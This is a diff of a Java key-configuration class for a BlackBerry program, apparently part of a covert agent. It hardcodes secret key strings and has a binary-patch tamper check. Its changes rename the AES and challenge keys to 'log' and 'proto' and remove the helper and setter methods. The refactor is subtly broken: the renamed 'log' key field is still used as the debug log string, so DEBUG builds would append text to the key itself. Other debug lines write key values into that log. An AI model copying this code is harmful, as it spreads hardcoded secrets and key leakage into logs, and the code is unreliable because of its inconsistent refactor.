@@ -1,23 +1,20 @@
 //#preprocess
 package blackberry.config;
 
-public class InstanceKeys {
+public class InstanceKeys extends KeysGetter {
 
     private static String conf = "Adf5V57gQtyi90wUhpb8Neg56756j87R";
-    private static String aes = "3j9WmmDgBqyU270FTid3719g64bP4s52";
-    private static String instanceID = "bg5etG87q20Kg52W5Fg1";
+    private static String log = "3j9WmmDgBqyU270FTid3719g64bP4s52";
     private static String buildID = "av3pVck1gb4eR2";
-    private static String challenge = "f7Hk0f5usd04apdvqw13F5ed25soV5eD";
+    private static String proto = "f7Hk0f5usd04apdvqw13F5ed25soV5eD";
 
-    private static byte[] byteAesKey;
-    private static byte[] byteChallengeKey;
+    private static byte[] byteLogKey;
+    private static byte[] byteProtoKey;
     private static byte[] byteConfKey;
     private static byte[] byteInstanceID;
 
     public InstanceKeys() {
     }
-
-    public static String log = "";
 
     /**
      * Checks for been binary patched.
@@ -37,14 +34,14 @@ public class InstanceKeys {
      * 
      * @return the aes key
      */
-    public byte[] getAesKey() {
-        if (byteAesKey == null) {
-            byteAesKey = keyFromString(aes);
+    public byte[] getLogKey() {
+        if (byteLogKey == null) {
+            byteLogKey = keyFromString(log);
             //#ifdef DEBUG
-            log += " aes: " + aes;
+            log += " log: " + log;
             //#endif
         }
-        return byteAesKey;
+        return byteLogKey;
     }
 
     /**
@@ -52,7 +49,7 @@ public class InstanceKeys {
      * 
      * @return the builds the id
      */
-    public byte[] getBuildId() {
+    public byte[] getBuildID() {
         return buildID.getBytes();
     }
 
@@ -61,15 +58,15 @@ public class InstanceKeys {
      * 
      * @return the challenge key
      */
-    public byte[] getChallengeKey() {
-        if (byteChallengeKey == null) {
-            byteChallengeKey = keyFromString(challenge);
+    public byte[] getProtoKey() {
+        if (byteProtoKey == null) {
+            byteProtoKey = keyFromString(proto);
             //#ifdef DEBUG
-            log += " challenge: " + challenge;
+            log += " challenge: " + proto;
             //#endif
         }
 
-        return byteChallengeKey;
+        return byteProtoKey;
     }
 
     /**
@@ -88,83 +85,5 @@ public class InstanceKeys {
         return byteConfKey;
     }
 
-    /**
-     * Gets the instance id.
-     * 
-     * @return the instance id
-     */
-    public byte[] getInstanceId() {
-
-        return byteInstanceID;
-    }
-
-    private byte[] keyFromString(final String string) {
-        try {
-            int len = 16;
-            byte[] array = new byte[len];
-            //#ifdef DEBUG
-            log += string + " : ";
-            //#endif
-
-            for (int pos = 0; pos < len; pos++) {
-                String repr = string.substring(pos * 2, pos * 2 + 2);
-                array[pos] = (byte) Integer.parseInt(repr, 16);
-                //#ifdef DEBUG
-                log += "" + pos + ":" + repr + " ";
-                //#endif
-            }
-
-            //#ifdef DEBUG
-            log += " | ";
-            //#endif
-            return array;
-        } catch (Exception ex) {
-            //#ifdef DEBUG
-            log += " Ex: " + ex;
-            log += " binary pathced: " + hasBeenBinaryPatched();
-            //#endif
-            return null;
-        }
-    }
-
-    /**
-     * Sets the aes key.
-     * 
-     * @param key
-     *            the new aes key
-     */
-    public void setAesKey(final byte[] key) {
-        byteAesKey = key;
-    }
-
-    /**
-     * Sets the builds the id.
-     * 
-     * @param build
-     *            the new builds the id
-     */
-    public void setBuildID(final String build) {
-        buildID = build;
-    }
-
-    /**
-     * Sets the challenge key.
-     * 
-     * @param challenge_
-     *            the new challenge key
-     */
-    public void setChallengeKey(final byte[] challenge_) {
-        byteChallengeKey = challenge_;
-    }
-
-    /**
-     * Sets the conf key.
-     * 
-     * @param conf_
-     *            the new conf key
-     */
-    public void setConfKey(final byte[] conf_) {
-        byteConfKey = conf_;
-    }
-
+ 
 }
